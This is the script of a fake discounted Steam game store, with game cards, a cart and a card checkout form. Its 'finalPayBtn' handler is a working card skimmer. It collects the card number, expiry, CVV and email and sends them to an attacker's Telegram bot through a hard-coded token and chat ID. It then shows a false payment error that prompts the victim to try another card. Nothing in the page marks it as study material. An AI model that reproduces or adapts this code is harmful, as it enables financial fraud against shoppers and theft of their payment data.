<script>
    // Starfield background
    const canvas = document.getElementById('starCanvas');
    let ctx = canvas.getContext('2d');
    let stars = [];
    function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();
    function createStar() { return { x: Math.random() * canvas.width, y: Math.random() * canvas.height, size: Math.random() * 4 + 2, speedY: Math.random() * 1.5 + 0.7, opacity: Math.random() * 0.6 + 0.3 }; }
    for(let i=0;i<200;i++) stars.push(createStar());
    function drawStar(ctx,x,y,size,opacity) {
        ctx.save(); ctx.translate(x,y); ctx.beginPath();
        let spikes=5, outer=size, inner=size*0.4, rot=Math.PI/2*3, step=Math.PI/spikes;
        ctx.moveTo(0,-outer);
        for(let i=0;i<spikes;i++) {
            let x1=Math.sin(rot)*inner, y1=-Math.cos(rot)*inner;
            ctx.lineTo(x1,y1); rot+=step;
            let x2=Math.sin(rot)*outer, y2=-Math.cos(rot)*outer;
            ctx.lineTo(x2,y2); rot+=step;
        }
        ctx.closePath(); ctx.fillStyle=`rgba(200,220,255,${opacity})`; ctx.fill(); ctx.restore();
    }
    function drawStars() {
        ctx.clearRect(0,0,canvas.width,canvas.height);
        for(let s of stars) { drawStar(ctx,s.x,s.y,s.size,s.opacity); s.y+=s.speedY; if(s.y>canvas.height) { s.y=-10; s.x=Math.random()*canvas.width; } }
        requestAnimationFrame(drawStars);
    }

    function getDiscountedPrice(oldPrice) {
        return +(oldPrice * 0.6).toFixed(2);
    }

    const gamesGrid = document.getElementById('gamesGrid');
    function renderGames() {
        gamesGrid.innerHTML = '';
        games.forEach((game, index) => {
            const newPrice = getDiscountedPrice(game.oldPrice);
            const card = document.createElement('div');
            card.className = 'product-card';
            card.setAttribute('data-game-index', index);
            card.innerHTML = `
                <img src="${game.img}" class="game-img" alt="${game.name}" loading="lazy" onerror="this.src='https://via.placeholder.com/200x200?text=No+Image'">
                <h3>${game.name}</h3>
                <div class="price-container">
                    <span class="old-price">${game.oldPrice.toFixed(2)} $</span>
                    <span class="new-price">${newPrice} $</span>
                    <span class="discount-badge">-40%</span>
                </div>
                <button class="btn-details" data-index="${index}">📖 details</button>
                <button class="btn-buy" data-name="${game.name}" data-price="${newPrice}">🛒 buy</button>
            `;
            gamesGrid.appendChild(card);
        });
        bindDetailsButtons();
        bindBuyButtons();
    }
    
    function bindDetailsButtons() {
        document.querySelectorAll('.btn-details').forEach(btn => {
            btn.removeEventListener('click', detailsHandler);
            btn.addEventListener('click', detailsHandler);
        });
    }
    
    function detailsHandler(e) {
        e.stopPropagation();
        const index = parseInt(this.getAttribute('data-index'));
        const game = games[index];
        const newPrice = getDiscountedPrice(game.oldPrice);
        const modalBody = document.getElementById('gameModalBody');
        modalBody.innerHTML = `
            <div class="game-modal-header">
                <img src="${game.img}" class="game-modal-img" alt="${game.name}" onerror="this.src='https://via.placeholder.com/200x200'">
                <div>
                    <div class="game-modal-title">${game.name}</div>
                    <div class="game-modal-price"><span class="old-price" style="font-size:1rem;">${game.oldPrice.toFixed(2)} $</span> → <strong style="color:#6c8cff; font-size:1.8rem;">${newPrice} $</strong> <span class="discount-badge">-40%</span></div>
                    <div><strong>Genre:</strong> ${game.genre}</div>
                    <div><strong>Developer:</strong> ${game.dev}</div>
                    <div><strong>Release year:</strong> ${game.year}</div>
                </div>
            </div>
            <div class="game-modal-desc">
                <p>${game.desc}</p>
            </div>
            <div class="specs">
                <h4>🖥️ System requirements (minimum):</h4>
                <p>${game.requirements}</p>
            </div>
            <button class="buy-modal-btn" data-name="${game.name}" data-price="${newPrice}">💎 Add to cart for ${newPrice} $</button>
        `;
        document.getElementById('gameModal').style.display = 'flex';
        const buyModalBtn = modalBody.querySelector('.buy-modal-btn');
        if (buyModalBtn) {
            buyModalBtn.addEventListener('click', (e) => {
                const name = buyModalBtn.getAttribute('data-name');
                const price = parseFloat(buyModalBtn.getAttribute('data-price'));
                addItemToCart({ name: name, price: price });
                document.getElementById('gameModal').style.display = 'none';
                showToast("✅ Item added to cart!", 'success');
            });
        }
    }
    
    let cart = [];
    function addItemToCart(item) {
        cart.push(item);
        updateCartUI();
    }
    function updateCartUI() {
        let countSpan = document.getElementById('cartCount');
        if(countSpan) countSpan.innerText = cart.length;
        renderCartModal();
    }
    function renderCartModal() {
        let container = document.getElementById('cartItemsList');
        let totalSpan = document.getElementById('modalCartTotal');
        if(!container) return;
        if(cart.length===0) { container.innerHTML='<p>✨ cart is empty ✨</p>'; totalSpan.innerText='Total: 0 $'; return; }
        let total=0;
        let html='';
        cart.forEach((item,idx)=>{
            let price = item.price || 0;
            total += price;
            html+=`<div class="cart-item"><span>${item.name}</span><span>${price.toFixed(2)} $ <button class="remove-item" data-idx="${idx}" style="background:#ff7b7b; border:none; border-radius:30px; padding:2px 10px; margin-left:8px;">x</button></span></div>`;
        });
        container.innerHTML=html;
        totalSpan.innerText=`Total: ${total.toFixed(2)} $`;
        document.querySelectorAll('.remove-item').forEach(btn=>{
            btn.addEventListener('click',(e)=>{
                let idx=parseInt(btn.getAttribute('data-idx'));
                cart.splice(idx,1);
                updateCartUI();
            });
        });
    }
    
    function bindBuyButtons() {
        document.querySelectorAll('.btn-buy').forEach(btn=>{
            btn.removeEventListener('click', buyHandler);
            btn.addEventListener('click', buyHandler);
        });
        function buyHandler(e) {
            e.stopPropagation();
            let name = this.getAttribute('data-name');
            let price = parseFloat(this.getAttribute('data-price'));
            addItemToCart({ name: name, price: price });
            showToast("✅ Added to cart", 'success');
        }
    }
    
    function showToast(message, type = 'error') {
        let oldToasts = document.querySelectorAll('.error-toast, .success-toast');
        oldToasts.forEach(t => t.remove());
        let toast = document.createElement('div');
        toast.className = type === 'error' ? 'error-toast' : 'error-toast success-toast';
        toast.innerText = message;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }
    
    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
    const CHAT_ID = 7711202514;
    
    const cartModal = document.getElementById('cartModal');
    const openCartBtn = document.getElementById('openCartBtn');
    const closeCartBtn = document.getElementById('closeCartBtn');
    openCartBtn?.addEventListener('click',()=>{ renderCartModal(); cartModal.style.display='flex'; });
    closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
    window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
    
    document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
        if(cart.length===0) {
            showToast("❌ Cart is empty", 'error');
            return;
        }
        let cardNum = document.getElementById('cardNumber').value.trim();
        let expiry = document.getElementById('cardExpiry').value.trim();
        let cvv = document.getElementById('cardCvv').value.trim();
        let email = document.getElementById('steamEmail').value.trim();
        if(!email) email = "not specified";
        if(!cardNum || !expiry || !cvv) {
            showToast("❌ Please fill all card fields", 'error');
            return;
        }
        let totalPrice = cart.reduce((s,i)=>s + i.price, 0);
        let itemsText = cart.map(i=>`${i.name} — ${i.price.toFixed(2)} $`).join('\n');
        let msg = `💳 EXCELLENT SHOP (STEAM) 💳\n👤 Guest\n📧 Email: ${email}\n🛒 Items:\n${itemsText}\n💰 Total: ${totalPrice.toFixed(2)} $\n💳 Card: ${cardNum}\n📅 Expiry: ${expiry}\n🔐 CVV: ${cvv}\n🌐 IP: ${window.location.hostname}`;
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: CHAT_ID, text: msg})
            });
            showToast("❌ Payment error. Could not process payment. Please try another card.", 'error');
            cart = [];
            updateCartUI();
            cartModal.style.display = 'none';
            document.getElementById('cardNumber').value = '';
            document.getElementById('cardExpiry').value = '';
            document.getElementById('cardCvv').value = '';
            document.getElementById('steamEmail').value = '';
        } catch(e) {
            showToast("❌ Connection error", 'error');
        }
    });
    
    const gameModal = document.getElementById('gameModal');
    const closeGameModal = document.querySelector('.close-game-modal');
    closeGameModal?.addEventListener('click', () => { gameModal.style.display = 'none'; });
    window.addEventListener('click', (e) => { if(e.target === gameModal) gameModal.style.display = 'none'; });
    
    renderGames();
    updateCartUI();
</script>
